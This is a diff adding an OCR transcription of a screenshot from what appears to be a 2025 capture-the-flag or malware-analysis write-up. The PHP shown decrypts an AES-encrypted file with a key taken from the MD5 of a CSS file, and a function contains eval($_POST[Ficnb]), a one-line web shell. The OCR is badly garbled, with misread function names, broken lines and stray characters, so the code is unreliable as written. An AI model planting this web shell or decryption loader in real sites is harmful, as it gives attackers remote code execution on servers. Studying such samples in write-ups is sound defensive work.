@@ -1,0 +1,23 @@
+# OCR: 8fbc4bbdb65b836b3d59b6ad23888cbc.webp
+# 来源: .\02-WriteUp\2025\8fbc4bbdb65b836b3d59b6ad23888cbc.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:32
+
+‘<?php
+$a=File_get_contents(’. /HiRiHIE.css");
+$b=md5($a, true);
+$c=File_get_contents("./encrypted.bin');
+se64_decode($c
+$e='aes-256-cbe’;
+$f=openss1_cipher_iv_length($e);
+S$e=substr($d,0, $F.
+Sh=substr($d, $F
+$izopenss1_decrypt ($h,$e,$b,OPENSSL_RAW_DATA,$g);
+echo $i;
+35
+口 Andowmserszemde X 《 个
+Cs c
+function ytjuhua( {
+echo "Kangle) is OK! FICer is good!";
+eval ($_POST[Ficnb])
+酮 sss>php test. php
